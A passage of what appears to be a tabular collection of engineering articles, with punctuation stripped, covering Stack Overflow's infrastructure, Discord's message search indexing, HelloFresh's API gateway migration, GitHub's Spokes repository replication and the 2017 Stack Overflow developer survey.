mentioned above  we re down to needing only 1 web server  We have unintentionally tested this  successfully  a few times  To be clear  I m saying it works  I m not saying it s a good idea  It s fun though  every time   Now that we have some baseline numbers for an idea of scale  let s see how we make those fancy web pages  Since few systems exist in complete isolation  and ours is no exception   architecture decisions often make far less sense without a bigger picture of how those pieces fit into the whole  That s the goal here  to cover the big picture  Many subsequent posts will do deep dives into specific areas  This will be a logistical overview with hardware highlights only  the next post will have the hardware details   For those of you here to see what the hardware looks like these days  here are a few pictures I took of rack A  it has a matching sister rack B  during our February 2015 upgrade    and if you re into that kind of thing  here s the entire 256 image album from that week  you re damn right that number s intentional   Now  let s dig into layout  Here s a logical overview of the major systems in play   Ground Rules  Here are some rules that apply globally so I don t have to repeat them with every setup   Everything is redundant   All servers and network gear have at least 2x 10Gbps connectivity   All servers have 2 power feeds via 2 power supplies from 2 UPS units backed by 2 generators and 2 utility feeds   All servers have a redundant partner between rack A and B   All servers and services are doubly redundant via another data center  Colorado   though I m mostly talking about New York here   Everything is redundant   The Internets  First you have to find us that s DNS  Finding us needs to be fast  so we farm this out to CloudFlare  currently  because they have DNS servers nearer to almost everyone around the world  We update our DNS records via an API and they do the  hosting  of DNS  But since we re jerks with deeply rooted trust issues  we still have our own DNS servers as well  Should the apocalypse happen  probably caused by the GPL  Punyon  or caching  and people still want to program to take their mind off of it  we ll flip them on   After you find our secret hideout  HTTP traffic comes from one of our four ISPs  Level 3  Zayo  Cogent  and Lightower in New York  and flows through one of our four edge routers  We peer with our ISPs using BGP  fairly standard  in order to control the flow of traffic and provide several avenues for traffic to reach us most efficiently  These ASR 1001 and ASR 1001 X routers are in 2 pairs  each servicing 2 ISPs in active active fashion so we re redundant here  Though they re all on the same physical 10Gbps network  external traffic is in separate isolated external VLANs which the load balancers are connected to as well  After flowing through the routers  you re headed for a load balancer   I suppose this may be a good time to mention we have a 10Gbps MPLS between our 2 data centers  but it is not directly involved in serving the sites  We use this for data replication and quick recovery in the cases where we need a burst   But Nick  that s not redundant   Well  you re technically correct  the best kind of correct   that s a single point of failure on its face  But wait  We maintain 2 more failover OSPF routes  the MPLS is  1  these are  2 and 3 by cost  via our ISPs  Each of the sets mentioned earlier connects to the corresponding set in Colorado  and they load balance traffic between in the failover situation  We could make both sets connect to both sets and have 4 paths but  well  whatever  Moving on   Load Balancers  HAProxy   The load balancers are running HAProxy 1 5 15 on CentOS 7  our preferred flavor of Linux  TLS  SSL  traffic is also terminated in HAProxy  We ll be looking hard at HAProxy 1 7 soon for HTTP 2 support   Unlike all other servers with a dual 10Gbps LACP network link  each load balancer has 2 pairs of 10Gbps  one for the external network and one for the DMZ  These boxes run 64GB or more of memory to more efficiently handle SSL negotiation  When we can cache more TLS sessions in memory for reuse  there s less to recompute on subsequent connections to the same client  This means we can resume sessions both faster and cheaper  Given that RAM is pretty cheap dollar wise  it s an easy choice   The load balancers themselves are a pretty simple setup  We listen to different sites on various IPs  mostly for certificate concerns and DNS management  and route to various backends based mostly on the host header  The only things of note we do here is rate limiting and some header captures  sent from our web tier  into the HAProxy syslog message so we can record performance metrics for every single request  We ll cover that later too   Web Tier  IIS 8 5  ASP Net MVC 5 2 3  and  Net 4 6 1   The load balancers feed traffic to 9 servers we refer to as  primary   01 09  and 2  dev meta   10 11  our staging environment  web servers  The primary servers run things like Stack Overflow  Careers  and all Stack Exchange sites except meta stackoverflow com and meta stackexchange com  which run on the last 2 servers  The primary Q A Application itself is multi tenant  This means that a single application serves the requests for all Q A sites  Put another way  we can run the entire Q A network off of a single application pool on a single server  Other applications like Careers  API v2  Mobile API  etc  are separate  Here s what the primary and dev tiers look like in IIS   Here s what Stack Overflow s distribution across the web tier looks like in Opserver  our internal monitoring dashboard     and here s what those web servers look like from a utilization perspective   I ll go into why we re so overprovisioned in future posts  but the highlight items are  rolling builds  headroom  and redundancy   Service Tier  IIS  ASP Net MVC 5 2 3   Net 4 6 1  and HTTP SYS   Behind those web servers is the very similar  service tier   It s also running IIS 8 5 on Windows 2012R2  This tier runs internal services to support the production web tier and other internal systems  The two big players here are  Stack Server  which runs the tag engine and is based on http sys  not behind IIS  and the Providence API  IIS based   Fun fact  I have to set affinity on each of these 2 processes to land on separate sockets because Stack Server just steamrolls the L2 and L3 cache when refreshing question lists on a 2 minute interval   These service boxes do heavy lifting with the tag engine and backend APIs where we need redundancy  but not 9x redundancy  For example  loading all of the posts and their tags that change every n minutes from the database  currently 2  isn t that cheap  We don t want to do that load 9 times on the web tier  3 times is enough and gives us enough safety  We also configure these boxes differently on the hardware side to be better optimized for the different computational load characteristics of the tag engine and elastic indexing jobs  which also run here   The  tag engine  is a relatively complicated topic in itself and will be a dedicated post  The basics are  when you visit  questions tagged java   you re hitting the tag engine to see which questions match  It does all of our tag matching outside of  search   so the new navigation  etc  are all using this service for data   Cache   Pub Sub  Redis   We use Redis for a few things here and it s rock solid  Despite doing about 160 billion ops a month  every instance is below 2  CPU  Usually much lower   We have a L1 L2 cache system with Redis   L1  is HTTP Cache on the web servers or whatever application is in play   L2  is falling back to Redis and fetching the value out  Our values are stored in the Protobuf format  via protobuf dot net by Marc Gravell  For a client  we re using StackExchange Redis written in house and open source  When one web server gets a cache miss in both L1 and L2  it fetches the value from source  a database query  API call  etc   and puts the result in both local cache and Redis  The next server wanting the value may miss L1  but would find the value in L2 Redis  saving a database query or API call   We also run many Q A sites  so each site has its own L1 L2 caching  by key prefix in L1 and by database ID in L2 Redis  We ll go deeper on this in a future post   Alongside the 2 main Redis servers  master slave  that run all the site instances  we also have a machine learning instance slaved across 2 more dedicated servers  due to memory   This is used for recommending questions on the home page  better matching to jobs  etc  It s a platform called Providence  covered by Kevin Montrose here   The main Redis servers have 256GB of RAM  about 90GB in use  and the Providence servers have 384GB of RAM  about 125GB in use    Redis isn t just for cache though  it also has a publish   subscriber mechanism where one server can publish a message and all other subscribers receive it including downstream clients on Redis slaves  We use this mechanism to clear L1 caches on other servers when one web server does a removal for consistency  but there s another great use  websockets   Websockets  NetGain   We use websockets to push real time updates to users such as notifications in the top bar  vote counts  new nav counts  new answers and comments  and a few other bits   The socket servers themselves are using raw sockets running on the web tier  It s a very thin application on top of our open source library  StackExchange NetGain   During peak  we have about 500 000 concurrent websocket connections open  That s a lot of browsers  Fun fact  some of those browsers have been open for over 18 months  We re not sure why  Someone should go check if those developers are still alive  Here s what this week s concurrent websocket pattern looks like   Why websockets  They re tremendously more efficient than polling at our scale  We can simply push more data with fewer resources this way  while being more instant to the user  They re not without issues though ephemeral port and file handle exhaustion on the load balancer are fun issues we ll cover later   Search  Elasticsearch   Spoiler  there s not a lot to get excited about here  The web tier is doing pretty vanilla searches against Elasticsearch 1 4  using the very slim high performance StackExchange Elastic client  Unlike most things  we have no plans to open source this simply because it only exposes a very slim subset of the API we use  I strongly believe releasing it would do more harm than good with developer confusion  We re using elastic for  search   calculating related questions  and suggestions when asking a question   Each Elastic cluster  there s one in each data center  has 3 nodes  and each site has its own index  Careers has an additional few indexes  What makes our setup a little non standard in the elastic world  our 3 server clusters are a bit beefier than average with all SSD storage  192GB of RAM  and dual 10Gbps network each   The same application domains  yeah  we re screwed with  Net Core here   in Stack Server that host the tag engine also continually index items in Elasticsearch  We do some simple tricks here such as ROWVERSION in SQL Server  the data source  compared against a  last position  document in Elastic  Since it behaves like a sequence  we can simply grab and index any items that have changed since the last pass   The main reason we re on Elasticsearch instead of something like SQL full text search is scalability and better allocation of money  SQL CPUs are comparatively very expensive  Elastic is cheap and has far more features these days  Why not Solr  We want to search across the entire network  many indexes at once   and this wasn t supported at decision time  The reason we re not on 2 x yet is a major change to  types  means we need to reindex everything to upgrade  I just don t have enough time to make the needed changes and migration plan yet   Databases  SQL Server   We re using SQL Server as our single source of truth  All data in Elastic and Redis comes from SQL Server  We run 2 SQL Server clusters with AlwaysOn Availability Groups  Each of these clusters has 1 master  taking almost all of the load  and 1 replica in New York  Additionally  they have 1 replica in Colorado  our DR data center   All replicas are asynchronous   The first cluster is a set of Dell R720xd servers  each with 384GB of RAM  4TB of PCIe SSD space  and 2x 12 cores  It hosts the Stack Overflow  Sites  bad name  I ll explain later   PRIZM  and Mobile databases   The second cluster is a set of Dell R730xd servers  each with 768GB of RAM  6TB of PCIe SSD space  and 2x 8 cores  This cluster runs everything else  That list includes Careers  Open ID  Chat  our Exception log  and every other Q A site  e g  Super User  Server Fault  etc     CPU utilization on the database tier is something we like to keep very low  but it s actually a little high at the moment due to some plan cache issues we re addressing  As of right now  NY SQL02 and 04 are masters  01 and 03 are replicas we just restarted today during some SSD upgrades  Here s what the past 24 hours looks like   Our usage of SQL is pretty simple  Simple is fast  Though some queries can be crazy  our interaction with SQL itself is fairly vanilla  We have some legacy Linq2Sql  but all new development is using Dapper  our open source Micro ORM using POCOs  Let me put this another way  Stack Overflow has only 1 stored procedure in the database and I intend to move that last vestige into code   Libraries  Okay let s change gears to something that can more directly help you  I ve mentioned a few of these up above  but I ll provide a list here of many open source  Net libraries we maintain for the world to use  We open sourced them because they have no core business value but can help the world of developers  I hope you find these useful today   Dapper   Net Core    High performance Micro ORM for ADO Net  StackExchange Redis   High performance Redis client  MiniProfiler   Lightweight profiler we run on every page  also supports Ruby  Go  and Node   Exceptional   Error logger for SQL  JSON  MySQL  etc   Jil   High performance JSON  de serializer  Sigil   A  Net CIL generation helper  for when C  isn t fast enough   NetGain   High performance websocket server  Opserver   Monitoring dashboard polling most systems directly and feeding from Orion  Bosun  or WMI as well   Bosun   Backend monitoring system  written in Go  Next up is a detailed current hardware list of what runs our code  After that  we go down the list  Stay tuned 
49,engineering,How Discord Indexes Billions of Messages   Discord BlogIndexing   Mapping the Data  At a really high level  in Elasticsearch  we have the concept of an  index   containing a number of  shards  within it  A shard in this case is actually a Lucene index  Elasticsearch is responsible for distributing the data within an index to a shard belonging to that index  If you want  you can control how the data is distributed amongst the shards by using a  routing key   An index can also contain a  replication factor   which is how many nodes an index  and its shards within  should be replicated to  If the node that the index is on fails a replica can take over  Unrelated but related  these replicas can also serve search queries  so you can scale the search throughput of the index by adding more replicas    Since we handed all of the sharding logic in the application level  our Shards   having Elasticsearch do the sharding for us didn t really make sense  However  we could use it to do replication and balancing of the indices between nodes in the cluster  In order to have Elasticsearch automatically create an index using the correct configuration  we used an index template  which contained the index configuration and data mapping  The index configuration was pretty simple   The index should only contain one shard  don t do any sharding for us   The index should be replicated to one node  be able to tolerate the failure of the primary node the index is on   The index should only refresh once every 60 minutes  why we had to do this is explained below    The index contains a single document type  message  Storing the raw message data in Elasticsearch made little sense as the data was not in a format that was easily searchable  Instead  we decided to take each message  and transform it into a bunch of fields containing metadata about the message that we can index and search on   You ll notice that we didn t include timestamp in these fields  and if you recall from our previous blog post  our IDs are Snowflakes  which means they inherently contain a timestamp  which we can use to power before  on  and after queries by using a minimum and maximum ID range    These fields however aren t actually  stored  in Elasticsearch  rather  they are only stored in the inverted index  The only fields that are actually stored and returned are the message  channel and server ID that the message was posted in  This means that message data is not duplicated in Elasticsearch  The tradeoff being that we ll have to fetch the message from Cassandra when returning search results  which is perfectly okay  because we d have to pull the message context  2 messages before   after  from Cassandra to power the UI anyway  Keeping the actual message object out of Elasticsearch means that we don t have to pay for additional disk space to store it  However  this means we can t use Elasticsearch to highlight matches in search results  We d have to build the tokenizers and language analyzers into our client to do the highlighting  which was really easy to do  
50,engineering,Scaling   HelloFresh  API GatewayMonday  February 20  2017 at 8 56AM  HelloFresh keeps growing every single day  our product is always improving  new ideas are popping up from everywhere  our supply chain is being completely automated  All of this is simply amazing us  but of course this constant growth brings many technical challenges   Today I d like to take you on a small journey that we went through to accomplish a big migration in our infrastructure that would allow us to move forward in a faster  more dynamic  and more secure way   The Challenge  We ve recently built an API Gateway  and now we had the complex challenge of moving our main  monolithic  API behind it   ideally without downtime  This would enable us to create more microservices and easily hook them into our infrastructure without much effort   The Architecture  Our gateway is on the frontline of our infrastructure  It receives thousands of request per day  and for that reason we chose Go when building it  because of its performance  simplicity  and elegant solution to concurrency   We already had many things in place that made this transition more simple  some of them are   Service Discovery and Client Side Load Balancing  We use consul as our service discovery tool  This together with HAProxy  enables us to solve two of the main problems when moving to a microservice architecture  service discovery  automatically registering new services as they come online  and client side load balancing  distributing requests across servers    Automation  Maybe the most useful tool in our arsenal was the automation of our infrastructure  We use Ansible to provision anything in our cloud   this goes from a single machine to dealing with network  DNS  CI machines  and so on  Importantly  we ve implemented a convention  when creating a new service  the first thing our engineers tackle is to create the Ansible scripts for this service   Logging and Monitoring  I like to say that anything that goes in our infrastructure should be monitored somehow  We have some best practices in place on how to properly log and monitor your application   Dashboards around the office show how the system is performing at any given time   For logging we use the ELK Stack  which allows us to quickly analyze detailed data about a service s behavior   For monitoring we love the combination of statsd   grafana  It is simply amazing what you can accomplish with this tool   Grafana dashboards give amazing insight into your performance metrics  Understanding the current architecture  Even with all these tools in place we still have a hard problem to solve  understand the current architecture and how we can pull off a smooth migration  At this stage  we invested some time on refactoring our legacy applications to support our new gateway and authentication service that would be also introduced in this migration  watch this space for another article on that   Ed    Some of the problems we found   While we can change our mobile apps  we have to assume people won t update straight away  So we had to keep backwards compatibility   for example in our DNS   to ensure older versions didn t stop working   We had to analyze all routes available in our public and private APIs and register them in the gateway in an automated way   We had to disable authentication from our main API and forward this responsibility to the auth service   Ensuring the security of the communication between the gateway and the microservices   To solve the import problems we wrote a script  in Go  again  to read our OpenAPI specification  aka Swagger  and create a proxy with the correct rules  like rate limiting  quotas  CORS  etc  for each resource of our APIs   To test the communication between the services we simply set up our whole infrastructure in a staging environment and started running our automated tests  I must say that this was the most helpful thing that we had during our migration process  We have a large suite of automated functional tests that helped us maintaining the same contract that the main API was returning to our mobile and web apps   After we were quite sure that our setup worked on our staging environment we started to think about on how to move this to production   The first attempt  Spoiler alert  our first attempt at going live was pretty much a disaster  Even though we had a quite nice plan in place we were definitely not ready to go live at that point  Let s check the step by step of our initial plan   Deploy latest version of the API gateway to staging  Deploy the main API with changes to staging  Run the automated functional tests against staging  Run manual QA tests on staging website and mobile apps  Deploy latest version of the API gateway to live  Deploy the main API with changes to live  Run the automated functional tests against live  Run manual QA tests on live website and mobile apps  Beer  Everything went quite well on staging  at least according to our tests   but when we decided to go live we started to have some problems   Overload on the auth database  we underestimated the amount of requests we d receive  causing our database to refuse connections Wrong CORS configuration  for some endpoints we configured the CORS rules incorrectly  causing requests from the browser to fail  Thanks to our database being flooded with requests we had to roll back right away  Luckily  our monitoring was able to catch that the problem occurred when requesting new tokens from the auth service   The second attempt  We knew that we didn t prepare well for our first deploy  so the first thing we did right after rolling back was hold a post mortem  Here s some of the things we improved before trying again   Prepare a blue green deployment procedure  We created a replica of our live environment with the gateway deployed already  so all we needed to when the time came was make one configuration change to bring this cluster online  We could rollback if necessary with the same simple change   Gather more metrics from the current applications to help us have the correct machine sizes to handle the load  We used the data from the first attempt as a yardstick for the amount of traffic we expected  and ran load tests with Gatling to ensure we could comfortably accommodate that traffic   Fix known issues with our auth service before going live  These included a problem with case sensitivity  a performance issue when signing a JWT  and  as always  adding more logging and monitoring   It took us around a week to finish all those tasks  and when we were finished  our deployment went smoothly with no downtime  Even with the successful deployment we found some corner case problems that we didn t cover on the automated tests  but we were able to fix them without a big impact on our applications   The results  In the end  our architecture looked like this   API Gateway Architecture  Main API  10  main API servers on High CPU Large machines  MySQL instances run in a master replica setup  3 replicas   Auth service  4 application servers  PostgreSQL instances run in a master replica setup  2 replicas   A RabbitMQ cluster is used to asynchronously handle user updates  API Gateway  4 application servers  MongoDB instances run in a master replica setup  4 replicas   Miscellaneous  Ansible is used to execute commands in parallel on all machines  A deploy takes only seconds  Amazon CloudFront as the CDN WAF  Consul   HAProxy as service discovery and client side load balancing  Statsd   Grafana to graph metrics across the system and alert on problems  ELK Stack for centralizing logs across different services  Concourse CI as our Continuous Integration tool  I hope you ve enjoyed our little journey  stay tuned for our next article 
51,engineering,Building resilience in SpokesSpokes is the replication system for the file servers where we store over 38 million Git repositories and over 36 million gists  It keeps at least three copies of every repository and every gist so that we can provide durable  highly available access to content even when servers and networks fail  Spokes uses a combination of Git and rsync to replicate  repair  and rebalance repositories   What is Spokes   Before we get into the topic at hand building resilience we have a new name to announce  DGit is now Spokes   Earlier this year  we announced  DGit  or  Distributed Git   our application level replication system for Git  We got feedback that the name  DGit  wasn t very distinct and could cause confusion with the Git project itself  So we have decided to rename the system Spokes   Defining resilience  In any system or service  there are two key ways to measure resilience  availability and durability  A system s availability is the fraction of the time it can provide the service it was designed to provide  Can it serve content  Can it accept writes  Availability can be partial  complete  or degraded  is every repository available  Are some repositories or whole servers slow   A system s durability is its resistance to permanent data loss  Once the system has accepted a write a push  a merge  an edit through the website  new repository creation  etc  it should never corrupt or revert that content  The key here is the moment that the system accepts the write  how many copies are stored  and where  Enough copies must be stored for us to believe with some very high probability that the write will not be lost   A system can be durable but not available  For example  if a system can t make the minimum required number of copies of an incoming write  it might refuse to accept writes  Such a system would be temporarily unavailable for writing  while maintaining the promise not to lose data  Of course  it is also possible for a system to be available without being durable  for example  by accepting writes whether or not they can be committed safely   Readers may recognize this as related to the CAP Theorem  In short  a system can satisfy at most two of these three properties   consistency  all nodes see the same data  availability  the system can satisfy read and write requests  partition tolerance  the system works even when nodes are down or unable to communicate  Spokes puts the highest priority on consistency and partition tolerance  In worst case failure scenarios  it will refuse to accept writes that it cannot commit  synchronously  to at least two replicas   Availability  Spokes s availability is a function of the availability of underlying servers and networks  and of our ability to detect and route around server and network problems   Individual servers become unavailable pretty frequently  Since rolling out Spokes this past spring  we have had individual servers crash due to a kernel deadlock and faulty RAM chips  Sometimes servers provide degraded service due to lesser hardware faults or high system load  In all cases  Spokes must detect the problem quickly and route around it  Each repository is replicated on three servers  so there s almost always an up to date  available replica to route to even if one server is offline  Spokes is more than the sum of its individually failure prone parts   Detecting problems quickly is the first step  Spokes uses a combination of heartbeats and real application traffic to determine when a file server is down  Using real application traffic is key for two reasons  First  heartbeats learn and react slowly  Each of our file servers handles a hundred or more incoming requests per second  A heartbeat that happens once per second would learn about a failure only after a hundred requests had already failed  Second  heartbeats test only a subset of the server s functionality  for example  whether or not the server can accept a TCP connection and respond to a no op request  But what if the failure mode is more subtle  What if the Git binary is corrupt  What if disk accesses have stalled  What if all authenticated operations are failing  No ops can often succeed when real traffic will fail   So Spokes watches for failures during the processing of real application traffic  and it marks a node as offline if too many requests fail  Of course  real requests do fail sometimes  Someone can try to read a branch that has already been deleted  or try to push to a branch they don t have access to  for example  So Spokes only marks the node offline if three requests fail in a row  That sometimes marks perfectly healthy nodes offline three requests can fail in a row just by random chance but not often  and the penalty for it is not large   Spokes uses heartbeats  too  but not as the primary failure detection mechanism  Instead  heartbeats have two purposes  polling system load and providing the all clear signal after a node has been marked as offline  As soon as a heartbeat succeeds  the node is marked as online again  If the heartbeat succeeds despite ongoing server problems  retrieving system load is almost a no op   the node will get marked offline again after three more failed requests   So Spokes detects that a node is down within about three failed operations  That s still three failed operations too many  For clean failures connections refused or timeouts all operations know how to try the next host  Remember  Spokes has three or more copies of every repository  A routing query for a repository returns not one server  but a list of three  or so  up to date replicas  sorted in preference order  If an operation attempted on the first choice replica fails  there are usually two other replicas to try   A graph of operations  here  remote procedure calls  or RPCs  failed over from one server to another clearly shows when a server is offline  In this graph  a single server is unavailable for about 1 5 hours  during this time  many thousands of RPC operations are redirected to other servers  This graph is the single best detector the Spokes team has for discovering misbehaving servers   Spokes s node offline detection is only advisory i e   only an optimization  A node that has had three failures in a row just gets moved to the end of the preference order for all read operations  rather than removed from the list of replicas  It s better for Spokes to try a probably offline replica last  than to not try it at all   This failure detector works well for server failures  when a server is overloaded or offline  operations to it will fail  Spokes detects those failures and temporarily stops directing traffic to the failed server until a heartbeat succeeds  However  failures of networks and application  Rails  servers are much messier  A given file server can appear to be offline to just a subset of the application servers  or one bad application server can spuriously determine that every file server is offline  So Spokes s failure detection is actually MxN  each application server keeps its own list of which file servers are offline  or not  If we see many application servers marking a single file server as offline  then it probably is  If we see a single application server marking many file servers offline  then we ve learned about a fault on that application server  instead   The figure below illustrates the MxN nature of failure detection and shows in red which failure detectors are true if a single file server  dfs4   is offline   In one recent incident  a single front end application server in a staging environment lost its ability to resolve the DNS names of the file servers  Because it couldn t reach the file servers to send them RPC operations or heartbeats  it concluded that every file server was offline  But that incorrect determination was limited to that one application server  all other application servers worked normally  So the flaky application server was immediately obvious in the RPC failover graphs  and no production traffic was affected   Durability  Sometimes  servers fail  Disks can fail  RAID controllers can fail  even entire servers or entire racks can fail  Spokes provides durability for repository data even in the face of such adversity   The basic building block of durability  like availability  is replication  Spokes keeps at least three copies of every repository  wiki  and gist  and those copies are in different racks  No updates to a repository pushes  renames  edits to a wiki  etc  are accepted unless a strict majority of the replicas can apply the change and get the same result   Spokes needs just one extra copy to survive a single node failure  So why a majority  It s possible  even common  for a repository to get multiple writes at roughly the same time  Those writes might conflict  one user might delete a branch while another user pushes new commits to that same branch  for example  Conflicting writes must be serialized that is  they have to be applied  or rejected  in the same order on every replica  so every replica gets the same result  The way Spokes serializes writes is by ensuring that every write acquires an exclusive lock on a majority of replicas  It s impossible for two writes to acquire a majority at the same time  so Spokes eliminates conflicts by eliminating concurrent writes entirely   If a repository exists on exactly three replicas  then a successful write on two replicas constitutes both a durable set  and a majority  If a repository has four or five replicas  then three are required for a majority   In contrast  many other replication and consensus protocols have a single primary copy at any moment  The order that writes arrive at the primary copy is the official order  and all other replicas must apply writes in that order  The primary is generally designated manually  or automatically using an election protocol  Spokes simply skips that step and treats every write as an election selecting a winning order and outcome directly  rather than a winning server that dictates the write order   Any write in Spokes that can t be applied identically at a majority of replicas gets reverted from any replica where it was applied  In essence  every write operation goes through a voting protocol  and any replicas on the losing side of the vote are marked as unhealthy unavailable for reads or writes until they can be repaired  Repairs are automatic and quick  Because a majority agreed either to accept or to roll back the update  there are still at least two replicas available to continue accepting both reads and writes while the unhealthy replica is repaired   To be clear  disagreements and repairs are exceptional cases  GitHub accepts many millions of repository writes each day  On a typical day  a few dozen writes will result in non unanimous votes  generally because one replica was particularly busy  the connection to it timed out  and the other replicas voted to move on without it  The lagging replica almost always recovers within a minute or two  and there is no user visible impact on the repository s availability   Rarer still are whole disk and whole server failures  but they do happen  When we have to remove an entire server  there are suddenly hundreds of thousands of repositories with only two copies  instead of three  This  too  is a repairable condition  Spokes checks periodically to see if every repository has the desired number of replicas  if not  more replicas are created  New replicas can be created anywhere  and they can be copied from wherever the surviving two copies of each repository are  Hence  repairs after a server failure are N to N  The larger the file server cluster  the faster it can recover from a single node failure   Clean shutdowns  As described above  Spokes can deal quickly and transparently with a server going offline or even failing permanently  So  can we use that for planned maintenance  when we need to reboot or retire a server  Yes and no   Strictly speaking  we can reboot a server with sudo reboot   and we can retire it just by unplugging it  But there are subtle disadvantages to doing so  so we have more careful mechanisms  reusing a lot of the same logic that would respond to a crash or a failure   Simply rebooting a server does not affect future read and write operations  which will be transparently directed to other replicas  It doesn t affect in progress write operations  either  as those are happening on all replicas  and the other two replicas can easily vote to proceed without the server we re rebooting  But a reboot does break in progress read operations  Most of those reads e g   fetching a README to display on a repository s home page are quick and will complete while the server shuts down gracefully  But some reads  particularly clones of large repositories  take minutes or hours to complete  depending on the speed of the end user s network  Breaking these is  well  rude  They can be restarted on another replica  but all progress up to that point would be lost   Hence  rebooting a server intentionally in Spokes begins with a quiescing period  While a server is quiescing  it is marked as offline for the purposes of new read operations  but existing read operations  including clones  are allowed to finish  Quiescing can take anywhere from a few seconds to many hours  depending on which read operations are active on the server that is getting rebooted   Perhaps surprisingly  write operations are sent to servers as usual  even while they quiesce  That s because write operations run on all replicas  so one replica can drop out at any time without user visible impact  Also  that replica would fall arbitrarily far behind if it didn t receive writes while quiescing  creating a lot of catch up load when it is finally brought fully back online   We don t perform  chaos monkey  testing on the Spokes file servers  for the same reasons we prefer to quiesce them before rebooting them  to avoid interrupting long running reads  That is  we do not reboot them randomly just to confirm that sudden  single node failures are still  mostly  harmless   Instead of  chaos monkey  testing  we perform rolling reboots as needed  which accomplish roughly the same testing goals  When we need to make some change that requires a reboot e g   changing kernel or filesystem parameters  or changing BIOS settings we quiesce and reboot each server  Racks serve as availability zones 1   so we quiesce entire racks at a time  As servers in a given rack finish quiescing i e   complete all outstanding read operations we reboot up to five of them at a time  When a whole rack is finished  we move on to the next rack   Below is a graph showing RPC operations failed over during a rolling reboot  Each server gets a different color  Values are stacked  so the tallest spike shows a moment where eight servers were rebooting at once  The large block of light red shows where one server did not reboot cleanly and was offline for over two hours   Retiring a server by simply unplugging it has the same disadvantages as unplanned reboots  and more  In addition to disrupting any in progress read operations  it creates several hours of additional risk for all the repositories that used to be hosted on the server  When a server disappears suddenly  all of the repositories formerly on it are now down to two copies  Two copies are enough to perform any read or write operation  but two copies aren t enough to tolerate an additional failure  In other words  removing a server without warning increases the probability of rejecting write operations later that same day  We re in the business of keeping that probability to a minimum   So instead  we prepare a server for retirement by removing it from the count of active replicas for any repository  Spokes can still use that server for both read and write operations  But when it asks if all repositories have enough replicas  suddenly some of them the ones on the retiring server will say no  and more replicas will be created  These repairs proceed exactly as if the server had just disappeared  except that now the server remains available in case some other server fails   Conclusions  Availability is important  and durability is more important still  Availability is a measure of what fraction of the time a service responds to requests  Durability is a measure of what fraction of committed data a service can faithfully store   Spokes keeps at least three replicas of every repository  to provide both availability and durability  Three replicas means that one server can fail with no user visible effect  If two servers fail  Spokes can provide full access for most repositories and read only access to repositories that had two of their replicas on the two failing servers   Spokes does not accept writes to a repository unless a majority of replicas and always at least two can commit the write and produce the same resulting repository state  That requirement provides consistency by ensuring the same write ordering on all replicas  It also provides durability in the face of single server failures by storing every committed write in at least two places   Spokes has a failure detector  based on monitoring live application traffic  that determines when a server is offline and routes around the problem  Finally  Spokes has automated repairs for recovering quickly when a disk or server fails permanently 
52,engineering,The State of Javascript   Jack FranklinPublished on Aug 11  2016  Jack Franklin  04 08 16     Jack Franklin treats us to his talk on  The State of JavaScript   where he explores  discusses and criticises the current state of web development with JavaScript       https   frontendne co uk talks the st   
53,engineering,Stack Overflow Developer Survey 2017Who codes  More people in more places than ever before   Each month  about 40 million people visit Stack Overflow to learn  share  and level up  We estimate that 16 8 million of these people are professional developers and university level students   Our estimate on professional developers comes from the things people read and do when they visit Stack Overflow  We collect data on user activity to help surface jobs we think you might find interesting and questions we think you can answer  You can download and clear this data at any time   Web developer 72 6  Desktop applications developer 28 9  Mobile developer 23 0  Database administrator 14 4  Developer with a statistics or mathematics background 11 3  Systems administrator 11 3  DevOps specialist 11 1  Embedded applications devices developer 9 3  Data scientist 8 4  Other 7 5  Graphics programming 4 8  Graphic designer 3 9  Machine learning specialist 3 8  Quality assurance engineer 3 5   36 125 responses  select all that apply  About three quarters of respondents identify as web developers  although many also said they are working to build desktop apps and mobile apps   Full stack Web developer 63 7  Back end Web developer 24 4  Front end Web developer 11 9  10 696 responses  select all that apply Android 64 8  iOS 57 6  Windows Phone 4 3  Blackberry 0 7  1 558 responses  select all that apply Analyst or consultant 38 8  Other 31 9  Data scientist 22 5  Educator or academic 15 0  Designer or illustrator 12 3  Product manager 7 5  C suite executive 5 3  Marketing or sales manager 3 1  Elected official 0 7  4 890 responses  select all that apply  Compared to the rest of the world  the United States has a higher proportion of people who identify as full stack web developers  whereas Germany has a comparatively lower proportion  As for mobile developers  the U S  and United Kingdom have proportionally more iOS developers and fewer Android developers than the rest of the world   People other than full time developers also write code as part of their jobs  and they come to Stack Overflow for help and community  This year  we gave additional occupation options to respondents who are not full time developers  but who occasionally code as part of their work  These roles include analyst  data scientist  and educator   Less than a year 2 9  1 to 2 years 5 4  2 to 3 years 6 4  3 to 4 years 7 2  4 to 5 years 7 6  5 to 6 years 7 0  6 to 7 years 5 6  7 to 8 years 4 8  8 to 9 years 3 7  9 to 10 years 6 3  10 to 11 years 4 3  11 to 12 years 2 7  12 to 13 years 2 6  13 to 14 years 2 1  14 to 15 years 3 9  15 to 16 years 3 3  16 to 17 years 2 0  17 to 18 years 1 7  18 to 19 years 1 3  19 to 20 years 2 0  20 or more years 17 2   51 145 responses  A common misconception about developers is that they ve all been programming since childhood  In fact  we see a wide range of experience levels  Among professional developers  one eighth  12 5   learned to code less than four years ago  and an additional one eighth  13 3   learned to code between four and six years ago  Due to the pervasiveness of online courses and coding bootcamps  adults with little to no programming experience can now more easily transition to a career as a developer   Less than a year 7 4  1 to 2 years 12 9  2 to 3 years 11 7  3 to 4 years 9 8  4 to 5 years 8 3  5 to 6 years 7 3  6 to 7 years 4 7  7 to 8 years 4 0  8 to 9 years 3 1  9 to 10 years 4 8  10 to 11 years 4 1  11 to 12 years 2 0  12 to 13 years 1 8  13 to 14 years 1 3  14 to 15 years 2 1  15 to 16 years 2 1  16 to 17 years 1 7  17 to 18 years 1 3  18 to 19 years 1 0  19 to 20 years 1 0  20 or more years 7 5   40 890 responses  Web and mobile developers have significantly less professional coding experience  on average  than developers in other technical disciplines such as systems administration and embedded programming  Across all developer kinds  the software industry acts as the primary incubator for new talent  but sees a relatively low proportion of more experienced developers  For example  60  of mobile developers at software firms have fewer than five years of professional coding experience  compared to 45  of mobile developers in other industries   Among professional developers  11 3  got their first coding jobs within a year of first learning how to program  A further 36 9  learned to program between one and four years before beginning their careers as developers  Globally  developers in Southern Asia had the lowest average amount of prior coding experience when beginning their careers  those in continental Europe had the highest   Less than a year 2 9  1 to 2 years 5 4  2 to 3 years 6 4  3 to 4 years 7 2  4 to 5 years 7 6  5 to 6 years 7 0  6 to 7 years 5 6  7 to 8 years 4 8  8 to 9 years 3 7  9 to 10 years 6 3  10 to 11 years 4 3  11 to 12 years 2 7  12 to 13 years 2 6  13 to 14 years 2 1  14 to 15 years 3 9  15 to 16 years 3 3  16 to 